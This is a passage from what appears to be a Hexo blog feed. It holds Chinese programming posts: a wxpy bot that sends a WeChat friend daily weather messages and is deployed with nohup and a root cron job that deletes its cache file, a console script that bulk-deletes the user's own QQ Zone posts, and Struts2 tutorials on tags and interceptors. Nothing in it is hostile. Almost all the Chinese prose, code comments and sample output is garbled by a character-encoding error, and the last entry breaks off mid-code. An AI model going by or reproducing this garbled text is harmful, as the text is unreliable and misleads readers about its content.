&quot;ymd&quot;:&quot;2018-12-29&quot;,            &quot;week&quot;:&quot;æ˜ŸæœŸå…­&quot;,            &quot;fx&quot;:&quot;ä¸œåŒ—é£&quot;,            &quot;fl&quot;:&quot;&lt;3çº§&quot;,            &quot;type&quot;:&quot;å¤šäº‘&quot;,            &quot;notice&quot;:&quot;é˜´æ™´ä¹‹é—´ï¼Œè°¨é˜²ç´«å¤–çº¿ä¾µæ‰°&quot;        }    ]}</code></pre><p>}</p><h2 id="2-å¯¹æ¥å£è¿”å›è¿‡æ¥çš„æ•°æ®è¿›è¡Œå¤„ç†"><a href="#2-å¯¹æ¥å£è¿”å›è¿‡æ¥çš„æ•°æ®è¿›è¡Œå¤„ç†" class="headerlink" title="2:å¯¹æ¥å£è¿”å›è¿‡æ¥çš„æ•°æ®è¿›è¡Œå¤„ç†"></a>2:å¯¹æ¥å£è¿”å›è¿‡æ¥çš„æ•°æ®è¿›è¡Œå¤„ç†</h2><p>æå–å‡ºæƒ³è¦çš„æ•°æ®</p><pre><code>city = data[&#39;cityInfo&#39;][&#39;city&#39;]  # åŸå¸‚    shidu = data[&#39;data&#39;][&quot;shidu&quot;]  # ç©ºæ°”æ¹¿åº¦    quality = data[&#39;data&#39;][&#39;quality&#39;]  # æ±¡æŸ“ç¨‹åº¦    sunrise = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;sunrise&#39;]  # æ—¥å‡ºæ—¶é—´    high = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;high&#39;]  # é«˜æ¸©    low = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;low&#39;]  # ä½æ¸©    type = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;type&#39;]  # å¤©æ°”ç±»å‹    notice = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;notice&#39;]  # é—®å€™è¯­</code></pre><p>æå–ç»“æœç„¶åè¿›è¡Œæ ¼å¼åŒ–å¤„ç†</p><pre><code>è®¸æ˜Œå¸‚ä»Šå¤©â¤å¤šäº‘â¤:æ¹¿åº¦ğŸ’§45%é«˜æ¸© 6.0â„ƒä½æ¸© -2.0â„ƒæ—¥å‡ºæ—¶é—´â˜€07:27ç©ºæ°”æ±¡æŸ“ç¨‹åº¦ğŸŒšä¸¥é‡æ±¡æŸ“ğŸ˜œé˜´æ™´ä¹‹é—´ï¼Œè°¨é˜²ç´«å¤–çº¿ä¾µæ‰°ğŸ˜œ</code></pre><h2 id="3-åˆ©ç”¨wxpyæ¨¡å—å‘é€å¤„ç†è¿‡åçš„æ•°æ®"><a href="#3-åˆ©ç”¨wxpyæ¨¡å—å‘é€å¤„ç†è¿‡åçš„æ•°æ®" class="headerlink" title="3:åˆ©ç”¨wxpyæ¨¡å—å‘é€å¤„ç†è¿‡åçš„æ•°æ®"></a>3:åˆ©ç”¨wxpyæ¨¡å—å‘é€å¤„ç†è¿‡åçš„æ•°æ®</h2><pre><code>content = get_weather()        # ä½ æœ‹å‹çš„å¾®ä¿¡åç§°ï¼Œä¸æ˜¯å¤‡æ³¨ï¼Œä¹Ÿä¸æ˜¯å¾®ä¿¡å¸å·ã€‚        my_friend = bot.friends().search(u&#39;æœªæ¥&#39;)[0]        my_friend.send(u&quot;æ—©å®‰â¤&quot;)        my_friend.send(content)        # æ¯86400ç§’ï¼ˆ1å¤©ï¼‰ï¼Œå‘é€1æ¬¡        t = Timer(86400, send_news)        t.start()    except:        # ä½ çš„å¾®ä¿¡åç§°ï¼Œä¸æ˜¯å¾®ä¿¡å¸å·ã€‚        my_friend = bot.friends().search(&#39;Coder&#39;)[0]        my_friend.send(u&quot;ä»Šå¤©æ¶ˆæ¯å‘é€å¤±è´¥äº†&quot;)</code></pre><h2 id="éƒ¨ç½²åˆ°Server"><a href="#éƒ¨ç½²åˆ°Server" class="headerlink" title="éƒ¨ç½²åˆ°Server"></a>éƒ¨ç½²åˆ°Server</h2><p>ç¯å¢ƒ</p><ul><li>é˜¿é‡Œäº‘CentOS</li><li>Python3</li></ul><p>ä½¿ç”¨nohupè®©Pythonè„šæœ¬åå°æ‰§è¡Œ</p><pre><code>nohup python3 WeChatGirl.py &amp;</code></pre><p>è¿è¡Œä¸Šé¢çš„å‘½ä»¤ä¹‹åä¼šåœ¨å½“å‰ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ªnohup.outæ–‡ä»¶,æ‰“å¼€nouhp.outæ–‡ä»¶æ‰«ç ç™»é™†å¾®ä¿¡å³å¯.</p><p>åæ¥å‘ç°ä¸€ä¸ªé—®é¢˜,å½“æˆ‘å°†ä»£ç è¿è¡Œçš„æ—¶é—´é—´éš”è°ƒæ•´æˆ1åˆ†é’Ÿçš„æ—¶å€™,ä¼šæŠ¥é”™.<br>åŸå› æ˜¯è¿è¡Œä»£ç ä¹‹åä¼šç”Ÿæˆä¸€ä¸ª<strong>botoo.pklæ–‡ä»¶</strong>,è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨crontabå®šæ—¶<strong>åˆ é™¤botoo.pkl</strong>æ–‡ä»¶å³å¯.</p><p>ç¼–è¾‘crontab</p><pre><code>SHELL=/bin/bashPATH=/sbin:/bin:/usr/sbin:/usr/binMAILTO=root# For details see man 4 crontabs# Example of job definition:# .---------------- minute (0 - 59)# |  .------------- hour (0 - 23)# |  |  .---------- day of month (1 - 31)# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat# |  |  |  |  |# *  *  *  *  * user-name  command to be executed# æ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡åˆ é™¤*/1 * * * * root rm -rf botoo.pkl</code></pre><p>ä¿®æ”¹å®Œä¹‹åé‡å¯crontabè¿™æ ·å°±è¾¾åˆ°äº†æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡æ–‡ä»¶åˆ é™¤å°±ä¸ä¼šæŠ¥é”™.</p><pre><code>sudo service crond restart</code></pre><p>æŸ¥çœ‹Crontabçš„è¿è¡Œæ—¥å¿—æ£€æŸ¥Crontabæ˜¯å¦æ‰§è¡Œ</p><pre><code>cat /var/log/cron</code></pre><p><strong>å¯ä»¥çœ‹åˆ°æ¯åˆ†é’Ÿéƒ½åˆ é™¤ä¸€æ¬¡botoo.pklæ–‡ä»¶</strong></p><pre><code>Dec 25 15:11:33 iz2ze8yfs65r3ciel5lbucz crontab[13873]: (root) LIST (root)Dec 25 15:12:01 iz2ze8yfs65r3ciel5lbucz CROND[13890]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:13:01 iz2ze8yfs65r3ciel5lbucz CROND[13911]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:14:01 iz2ze8yfs65r3ciel5lbucz CROND[13938]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:15:01 iz2ze8yfs65r3ciel5lbucz CROND[13965]: (root) CMD ( /home/staragent/bin/sa_recovery.sh)Dec 25 15:15:01 iz2ze8yfs65r3ciel5lbucz CROND[13966]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:16:01 iz2ze8yfs65r3ciel5lbucz CROND[14035]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:17:01 iz2ze8yfs65r3ciel5lbucz CROND[14062]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:18:01 iz2ze8yfs65r3ciel5lbucz CROND[14115]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:19:01 iz2ze8yfs65r3ciel5lbucz CROND[14179]: (root) CMD (rm -rf botoo.pkl)Dec 25 15:19:57 iz2ze8yfs65r3ciel5lbucz crontab[14215]: (root) LIST (root)Dec 25 15:20:01 iz2ze8yfs65r3ciel5lbucz CROND[14219]: (root) CMD (/usr/lib64/sa/sa1 1 1)Dec 25 15:20:01 iz2ze8yfs65r3ciel5lbucz CROND[14220]: (root) CMD ( /home/staragent/bin/sa_recovery.sh)Dec 25 15:20:01 iz2ze8yfs65r3ciel5lbucz CROND[14221]: (root) CMD (rm -rf botoo.pkl)</code></pre><h1 id="å®Œæ•´Pythonä»£ç "><a href="#å®Œæ•´Pythonä»£ç " class="headerlink" title="å®Œæ•´Pythonä»£ç "></a>å®Œæ•´Pythonä»£ç </h1><pre><code>from __future__ import unicode_literalsfrom threading import Timerfrom wxpy import *import requests# bot = Bot()# city_code = 101180401# url = http://t.weather.sojson.com/api/weather/city/101180401# linuxæ‰§è¡Œç™»é™†è¯·è°ƒç”¨ä¸‹é¢çš„è¿™å¥bot = Bot(console_qr=2, cache_path=&quot;botoo.pkl&quot;)headers = {    &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36&quot;,    &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;,    &quot;Host&quot;: &quot;t.weather.sojson.com&quot;,    &quot;Proxy-Connection&quot;: &quot;keep-alive&quot;,    &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;}content = &quot;&quot;&quot;{city}ä»Šå¤©â¤{type}â¤:\næ¹¿åº¦ğŸ’§{shidu}\n{high}\n{low}\næ—¥å‡ºæ—¶é—´â˜€{sunrise}\nç©ºæ°”æ±¡æŸ“ç¨‹åº¦ğŸŒš{quality}\nğŸ˜œ{notice}ğŸ˜œ&quot;&quot;&quot;def get_weather():    data = requests.get(&quot;http://t.weather.sojson.com/api/weather/city/101180401&quot;, headers=headers).json()    city = data[&#39;cityInfo&#39;][&#39;city&#39;]  # åŸå¸‚    shidu = data[&#39;data&#39;][&quot;shidu&quot;]  # ç©ºæ°”æ¹¿åº¦    quality = data[&#39;data&#39;][&#39;quality&#39;]  # æ±¡æŸ“ç¨‹åº¦    sunrise = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;sunrise&#39;]  # æ—¥å‡ºæ—¶é—´    high = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;high&#39;]  # é«˜æ¸©    low = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;low&#39;]  # ä½æ¸©    type = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;type&#39;]  # å¤©æ°”ç±»å‹    notice = data[&#39;data&#39;][&#39;forecast&#39;][0][&#39;notice&#39;]  # é—®å€™è¯­    return content.format(city=city, type=type, shidu=shidu, high=high, low=low, sunrise=sunrise, quality=quality,                          notice=notice)def send_news():    try:        content = get_weather()        # ä½ æœ‹å‹çš„å¾®ä¿¡åç§°ï¼Œä¸æ˜¯å¤‡æ³¨ï¼Œä¹Ÿä¸æ˜¯å¾®ä¿¡å¸å·ã€‚        my_friend = bot.friends().search(u&#39;æœªæ¥&#39;)[0]        my_friend.send(u&quot;æ—©å®‰â¤&quot;)        my_friend.send(content)        # æ¯86400ç§’ï¼ˆ1å¤©ï¼‰ï¼Œå‘é€1æ¬¡        t = Timer(86400, send_news)        t.start()    except:        # ä½ çš„å¾®ä¿¡åç§°ï¼Œä¸æ˜¯å¾®ä¿¡å¸å·ã€‚        my_friend = bot.friends().search(&#39;Coder&#39;)[0]        my_friend.send(u&quot;ä»Šå¤©æ¶ˆæ¯å‘é€å¤±è´¥äº†&quot;)if __name__ == &quot;__main__&quot;:    send_news()</code></pre><h1 id="åŸå¸‚code"><a href="#åŸå¸‚code" class="headerlink" title="åŸå¸‚code"></a>åŸå¸‚code</h1><pre><code>http://cdn.sojson.com/_city.json</code></pre><h1 id="End"><a href="#End" class="headerlink" title="End"></a>End</h1><p>åœ¨è¿™ä¸ªå¿«èŠ‚å¥çš„éƒ½å¸‚ä¸­,æ²¡æœ‰å‡ ä¸ªäººä¼šåœ¨æœ‰é™çš„ç”Ÿå‘½åŠ›èŠ±æ—¶é—´å’Œç²¾åŠ›æ…¢æ…¢èµ°è¿›ä½ çš„å†…å¿ƒå»å‘ç°ä½ çš„å†…åœ¨ç¾çš„.</p><p>å†™å‡ºæ¼‚äº®çš„ä»£ç ,åšä¸€ä¸ªå¸…æ°”çš„ç¨‹åºå‘˜.</p><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=364901&auto=1&height=66"></iframe>]]></content>
      
      
      <categories>
          
          <category> PythonApplication </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>JavaScriptæ‰¹é‡åˆ é™¤è¯´è¯´</title>
      <link href="/2018/12/24/javascript-pi-liang-shan-chu-shuo-shuo/"/>
      <url>/2018/12/24/javascript-pi-liang-shan-chu-shuo-shuo/</url>
      
        <content type="html"><![CDATA[<p>ä½¿ç”¨æµè§ˆå™¨æ‰“å¼€QQç©ºé—´-&gt;è¯´è¯´-&gt;F12æ‰“å¼€æµè§ˆå™¨çš„å¼€å‘è€…æ¨¡å¼è¾“å…¥ä¸‹é¢çš„Jsä»£ç </p><pre><code>var delay = 1000;        //å˜é‡function del() {    //åˆ é™¤æ–¹æ³•    document.querySelector(&#39;.app_canvas_frame&#39;).contentDocument.querySelector(&#39;.del_btn&#39;).click();    setTimeout(&quot;yes()&quot;, delay);}function yes() {    //ç‚¹å‡»ç¡®è®¤åˆ é™¤çš„æ–¹æ³•    document.querySelector(&#39;.qz_dialog_layer_btn&#39;).click();    setTimeout(&quot;del()&quot;, delay);}del();</code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2Inputé€»è¾‘è§†å›¾</title>
      <link href="/2018/12/22/struts2input-luo-ji-shi-tu/"/>
      <url>/2018/12/22/struts2input-luo-ji-shi-tu/</url>
      
        <content type="html"><![CDATA[<p>Actionæ¥å£ä¸­æä¾›äº†äº”ä¸ªé€»è¾‘è§†å›¾çš„åç§°ï¼š</p><ol><li>success</li><li>input</li><li>none</li><li>login</li><li><p>error</p><pre><code> public static final String SUCCESS = &quot;success&quot;; public static final String NONE = &quot;none&quot;; public static final String ERROR = &quot;error&quot;; public static final String INPUT = &quot;input&quot;; public static final String LOGIN = &quot;login&quot;;</code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2çš„æ ‡ç­¾åº“</title>
      <link href="/2018/12/22/struts2-de-biao-qian-ku/"/>
      <url>/2018/12/22/struts2-de-biao-qian-ku/</url>
      
        <content type="html"><![CDATA[<h1 id="Struts2çš„æ ‡ç­¾åº“"><a href="#Struts2çš„æ ‡ç­¾åº“" class="headerlink" title="Struts2çš„æ ‡ç­¾åº“"></a>Struts2çš„æ ‡ç­¾åº“</h1><p>åœ¨Struts2çš„å®‰è£…æ–‡ä»¶-&gt;docs-&gt;tag-reference.htmlæ–‡ä»¶ä¸­æŸ¥çœ‹Struts2çš„é€šç”¨æ ‡ç­¾åº“</p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/CjEgWhu08Q9KjewXPg*v0n3*i9eWleVAhsL*tskPU0E!/b/dLYAAAAAAAAA&amp;bo=nAQ4BAAAAAADJ6Y!&amp;rf=viewer_4" alt="Struts2çš„é€šç”¨æ ‡ç­¾åº“"></p><h2 id="UIæ ‡ç­¾åº“"><a href="#UIæ ‡ç­¾åº“" class="headerlink" title="UIæ ‡ç­¾åº“"></a>UIæ ‡ç­¾åº“</h2><p>UIæ ‡ç­¾åº“ä¸€å¤§ç‰¹ç‚¹æ˜¯æ–¹ä¾¿æ•°æ®å›æ˜¾,è€Œä¸”ç›¸æ¯”ä¼ ç»ŸHTMLæ ‡ç­¾æ›´åŠ æ¼‚äº®.</p><pre><code>&lt;h2&gt;æ™®é€šè¡¨å•&lt;/h2&gt;        &lt;form action=&quot;${ pageContext.request.contextPath}/uiAction.action&quot; method=&quot;post&quot;&gt;        &lt;!-- éšè—å­—æ®µ --&gt;            &lt;input type=&quot;hidden&quot; name=&quot;userId&quot;&gt;            ç”¨æˆ·å:&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;&lt;br&gt;            å¯†ç :&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;&lt;br&gt;            å¹´é¾„:&lt;input type=&quot;text&quot; name=&quot;age&quot;&gt;&lt;br&gt;            æ€§åˆ«:&lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;ç”·&quot;&gt;ç”·            &lt;input type=&quot;radio&quot; name=&quot;sex&quot; value=&quot;å¥³&quot;&gt;å¥³&lt;br&gt;             ç±è´¯&lt;select name=&quot;city&quot;&gt;                &lt;option value=&quot;&quot;&gt;---è¯·é€‰æ‹©---&lt;/option&gt;                &lt;option value=&quot;åŒ—äº¬&quot;&gt;åŒ—äº¬&lt;/option&gt;                &lt;option value=&quot;å¹¿å·&quot;&gt;å¹¿å·&lt;/option&gt;                &lt;option value=&quot;éƒ‘å·&quot;&gt;éƒ‘å·&lt;/option&gt;            &lt;/select&gt;&lt;br&gt;             çˆ±å¥½:&lt;input type=&quot;checkbox&quot; name=&quot;bobby&quot; value=&quot;ç¯®çƒ&quot;&gt;ç¯®çƒ            &lt;input type=&quot;checkbox&quot; name=&quot;bobby&quot; value=&quot;è¶³çƒ&quot;&gt;è¶³çƒ            &lt;input type=&quot;checkbox&quot; name=&quot;bobby&quot; value=&quot;ç”µè„‘&quot;&gt;ç”µè„‘            &lt;input type=&quot;checkbox&quot; name=&quot;bobby&quot; value=&quot;ç¼–ç¨‹&quot;&gt;ç¼–ç¨‹&lt;br&gt;            ä»‹ç»:&lt;textarea rows=&quot;2&quot; cols=&quot;10&quot; name=&quot;info&quot;&gt;I like Java&lt;/textarea&gt;            &lt;input type=&quot;submit&quot; value=&quot;æäº¤&quot;&gt;        &lt;/form&gt;        &lt;s:debug&gt;&lt;/s:debug&gt;        &lt;h2&gt;UIè¡¨å•&lt;/h2&gt;        &lt;s:form action=&quot;uiAction&quot; namespace=&quot;/&quot; method=&quot;post&quot;&gt;            &lt;s:hidden name=&quot;userId&quot;&gt;&lt;/s:hidden&gt;            &lt;s:textfield name=&quot;name&quot; label=&quot;ç”¨æˆ·å&quot;&gt;&lt;/s:textfield&gt;            &lt;s:password name=&quot;password&quot; label=&quot;å¯†ç &quot; showPassword=&quot;true&quot;&gt;&lt;/s:password&gt;    &lt;!-- å¯†ç é»˜è®¤ä¸å›æ˜¾éœ€è¦åŠ ä¸Š showPassword=&quot;true&quot;--&gt;            &lt;s:textfield name=&quot;age&quot; label=&quot;å¹´é¾„&quot;&gt;&lt;/s:textfield&gt;            &lt;s:radio list=&quot;{&#39;ç”·&#39;,&#39;å¥³&#39;}&quot; name=&quot;sex&quot; label=&quot;æ€§åˆ«&quot;&gt;&lt;/s:radio&gt;            &lt;s:select list=&quot;{&#39;åŒ—äº¬&#39;,&#39;å¹¿å·&#39;,&#39;éƒ‘å·&#39;}&quot; name=&quot;city&quot; label=&quot;ç±è´¯&quot; headerKey=&quot;&quot; headerValue=&quot;---è¯·é€‰æ‹©---&quot;&gt;&lt;/s:select&gt;            &lt;s:checkboxlist list=&quot;#{&#39;ç¯®çƒ&#39;:&#39;ç¯®çƒ&#39;,&#39;è¶³çƒ&#39;:&#39;è¶³çƒ&#39;,&#39;ç”µè„‘&#39;:&#39;ç”µè„‘&#39;,&#39;ç¼–ç¨‹&#39;:&#39;ç¼–ç¨‹&#39;}&quot; name=&quot;bobby&quot; label=&quot;çˆ±å¥½&quot;&gt;&lt;/s:checkboxlist&gt;            &lt;s:textarea name=&quot;info&quot; cols=&quot;10&quot; rows=&quot;2&quot; label=&quot;ä»‹ç»&quot; value=&quot;IlikeJava&quot;&gt;&lt;/s:textarea&gt;            &lt;s:submit value=&quot;æäº¤&quot;&gt;&lt;/s:submit&gt;        &lt;/s:form&gt;    &lt;/center&gt;</code></pre><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/XsO361zx3Bphd*RZobHoETK8OFFLV*8P9oz4RL2m.6A!/b/dFQBAAAAAAAA&amp;bo=OAQFBQAAAAADBx4!&amp;rf=viewer_4" alt="æ™®é€šæ ‡ç­¾å’ŒUIæ ‡ç­¾çš„å¯¹æ¯”"></p><p>æ¥çœ‹çœ‹å¯¹æ¯”:</p><ol><li>æ™®é€šè¡¨å•ç¾è§‚åº¦æ²¡æœ‰<strong>Struts2UIè¡¨å•ç¾è§‚åº¦å¥½</strong></li><li>æ™®é€šHTMLæ ‡ç­¾ä»£ç é‡æ¯”Struts2è¦å¤šå¾ˆå¤š,<strong>Struts2æ ‡ç­¾å†™èµ·æ¥ç®€å•</strong>.</li><li>æ™®é€šHtmlæ ‡ç­¾æ²¡æœ‰å›æ˜¾åŠŸèƒ½,<strong>Struts2çš„UIæ ‡ç­¾è‡ªå¸¦å›æ˜¾åŠŸèƒ½</strong></li></ol><p><strong>Struts2çš„å›æ˜¾çš„æ•°æ®æ˜¯ä»ValueStackä¸­è·å–çš„.</strong></p><h2 id="é€šç”¨æ ‡ç­¾åº“"><a href="#é€šç”¨æ ‡ç­¾åº“" class="headerlink" title="é€šç”¨æ ‡ç­¾åº“"></a>é€šç”¨æ ‡ç­¾åº“</h2><ul><li>åˆ¤æ–­æ ‡ç­¾<ol><li>&lt;s:if&gt;</li><li>&lt;s:elseif&gt;</li><li>&lt;s:else&gt;</li></ol></li><li>è¿­ä»£æ ‡ç­¾<ol><li>&lt;s:iterator&gt;</li></ol></li><li>å±æ€§æ ‡ç­¾<ol><li>&lt;s:property&gt;</li></ol></li><li>è°ƒè¯•æ ‡ç­¾<ol><li>&lt;s:debug&gt;</li></ol></li><li>æ—¥æœŸæ ‡ç­¾<ol><li>&lt;s:date&gt;</li></ol></li></ul><p>Iteratoræ ‡ç­¾ä½¿ç”¨æ¡ˆä¾‹</p><pre><code>&lt;center&gt;             &lt;s:iterator var=&quot;i&quot; value=&quot;{&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;}&quot;&gt;                 &lt;s:property value=&quot;#i&quot;/&gt;             &lt;/s:iterator&gt;             &lt;hr&gt;             &lt;!-- éå†map --&gt;             &lt;s:iterator var=&quot;m&quot; value=&quot;#{&#39;name&#39;:&#39;å¼ ä¸‰&#39;,&#39;age&#39;:27,&#39;hobby&#39;:&#39;Programme&#39;}&quot;&gt;                 &lt;s:property value=&quot;#m.key&quot;/&gt; -------------&gt;&lt;s:property value=&quot;#m.value&quot;/&gt;&lt;br&gt;             &lt;/s:iterator&gt;             &lt;hr&gt;             &lt;!-- å¾ªç¯ --&gt;             &lt;s:iterator var=&quot;i&quot; begin=&quot;1&quot; end=&quot;20&quot; step=&quot;1&quot;&gt;                 &lt;s:property value=&quot;#i&quot; /&gt;&lt;br&gt;             &lt;/s:iterator&gt;             &lt;hr&gt;             &lt;!-- iteratorä¸­statusçš„åº”ç”¨,Statusç”¨æ¥è®°å½•å¾ªç¯çš„çŠ¶æ€ --&gt;             &lt;s:iterator var=&quot;i&quot; begin=&quot;1&quot; end=&quot;20&quot; step=&quot;2&quot; status=&quot;status&quot;&gt;                 &lt;s:if test=&quot;#status.count % 3 == 0&quot;&gt;                     &lt;font color=&quot;blue&quot;&gt;&lt;s:property value=&quot;#i&quot;/&gt;&lt;/font&gt;                 &lt;/s:if&gt;                 &lt;s:else&gt;                     &lt;font color=&quot;green&quot;&gt;&lt;s:property value=&quot;#i&quot;/&gt;&lt;/font&gt;                 &lt;/s:else&gt;             &lt;/s:iterator&gt;&lt;/center&gt;</code></pre><p>åˆ¤æ–­æ ‡ç­¾çš„ä½¿ç”¨æ¡ˆä¾‹</p><pre><code>&lt;s:set var=&quot;i&quot; value=&quot;3&quot; scope=&quot;request&quot;&gt;&lt;/s:set&gt;&lt;s:if test=&quot;#request.i&gt;3&quot;&gt;    iå¤§äº3&lt;/s:if&gt;&lt;s:elseif test=&quot;#request.i&lt;3&quot;&gt;    iå°äº3&lt;/s:elseif&gt;&lt;s:else&gt;    iç­‰äº3 &lt;/s:else&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Struts2ä¸­çš„æ‹¦æˆªå™¨</title>
      <link href="/2018/12/22/struts2-zhong-de-lan-jie-qi/"/>
      <url>/2018/12/22/struts2-zhong-de-lan-jie-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯æ‹¦æˆªå™¨"><a href="#ä»€ä¹ˆæ˜¯æ‹¦æˆªå™¨" class="headerlink" title="ä»€ä¹ˆæ˜¯æ‹¦æˆªå™¨"></a>ä»€ä¹ˆæ˜¯æ‹¦æˆªå™¨</h1><ul><li>Interceptorï¼šæ‹¦æˆªå™¨ï¼Œèµ·åˆ°æ‹¦æˆªActionçš„ä½œç”¨ã€‚<ul><li>Interceptorï¼šæ‹¦æˆªå™¨ï¼Œæ‹¦æˆªæ˜¯å®¢æˆ·ç«¯å¯¹Actionçš„è®¿é—®ã€‚æ›´ç»†ç²’åº¦åŒ–çš„æ‹¦æˆªã€‚ï¼ˆæ‹¦æˆªActionä¸­çš„å…·ä½“çš„æ–¹æ³•ï¼‰ã€‚<br>Struts2æ¡†æ¶æ ¸å¿ƒçš„åŠŸèƒ½éƒ½æ˜¯ä¾èµ–æ‹¦æˆªå™¨å®ç°ã€‚</li></ul></li><li>Filterï¼šè¿‡æ»¤å™¨ï¼Œè¿‡æ»¤ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€çš„è¯·æ±‚ã€‚</li></ul><h1 id="Struts2çš„æ‰§è¡Œæµç¨‹"><a href="#Struts2çš„æ‰§è¡Œæµç¨‹" class="headerlink" title="Struts2çš„æ‰§è¡Œæµç¨‹"></a>Struts2çš„æ‰§è¡Œæµç¨‹</h1><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/5sIReyNv*kZeGD6FsWrCZTWCHOmtQmpKAPDrTdmJkZI!/b/dDcBAAAAAAAA&amp;bo=JAI6AgAAAAARBy4!&amp;rf=viewer_4" alt="Struts2æ‰§è¡Œæµç¨‹å›¾"></p><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/8rjImMd3RHjD*iHhf4Ba96Xz5EAIUiULhmSfp6sIHmg!/b/dL8AAAAAAAAA&amp;bo=PwU4BAAAAAARFyY!&amp;rf=viewer_4" alt=""></p><p>å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªActionçš„è¯·æ±‚ï¼Œæ‰§è¡Œ<strong>æ ¸å¿ƒè¿‡æ»¤å™¨</strong>ï¼ˆdoFilterï¼‰æ–¹æ³•ã€‚åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œ<strong>è°ƒç”¨executeAction()æ–¹æ³•</strong>ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•å†…éƒ¨è°ƒç”¨dispatcher.serviceAction();åœ¨è¿™ä¸ªæ–¹æ³•å†…éƒ¨åˆ›å»ºä¸€ä¸ªActionä»£ç†ï¼Œæœ€ç»ˆæ‰§è¡Œçš„æ˜¯Actionä»£ç†ä¸­çš„execute(),åœ¨ä»£ç†ä¸­æ‰§è¡Œçš„executeæ–¹æ³•ä¸­è°ƒç”¨ActionInvocationçš„invokeæ–¹æ³•ã€‚åœ¨è¿™ä¸ªæ–¹æ³•å†…éƒ¨é€’å½’æ‰§è¡Œä¸€ç»„æ‹¦æˆªå™¨ï¼ˆå®Œæˆéƒ¨åˆ†åŠŸèƒ½ï¼‰ï¼Œ<strong>å¦‚æœæ²¡æœ‰ä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨ï¼Œå°±ä¼šæ‰§è¡Œç›®æ ‡Actionï¼Œæ ¹æ®Actionçš„è¿”å›çš„ç»“æœè¿›è¡Œé¡µé¢è·³è½¬ã€‚</strong></p><h1 id="æ‹¦æˆªå™¨å…¥é—¨"><a href="#æ‹¦æˆªå™¨å…¥é—¨" class="headerlink" title="æ‹¦æˆªå™¨å…¥é—¨"></a>æ‹¦æˆªå™¨å…¥é—¨</h1><h2 id="æ‹¦æˆªå™¨ç±»"><a href="#æ‹¦æˆªå™¨ç±»" class="headerlink" title="æ‹¦æˆªå™¨ç±»"></a>æ‹¦æˆªå™¨ç±»</h2><p>InterceptorDemo1</p><pre><code>public class InterceptorDemo1 extends AbstractInterceptor {    // ç»§æ‰¿AbstractInterceptor    @Override    // å®ç°interceptæ–¹æ³•    public String intercept(ActionInvocation invocation) throws Exception {        System.out.println(&quot;InterceptorDemo1æ‰§è¡Œäº†---------------------&quot;);        String obj = invocation.invoke();    // å¦‚æœæœ‰ä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨æ‰§è¡Œä¸‹ä¸€ä¸ªæ‹¦æˆªå™¨,æ²¡æœ‰çš„è¯æ‰§è¡ŒAction        System.out.println(&quot;InterceptorDemo1æ‰§è¡Œç»“æŸ---------------------&quot;);        return obj;     }}</code></pre><p>InterceptorDemo2</p><pre><code>public class InterceptorDemo2 extends AbstractInterceptor {    // ç»§æ‰¿AbstractInterceptor    @Override    // å®ç°interceptæ–¹æ³•    public String intercept(ActionInvocation invocation) throws Exception {        System.out.println(&quot;InterceptorDemo2æ‰§è¡Œäº†---------------------&quot;);        String obj = invocation.invoke();    // 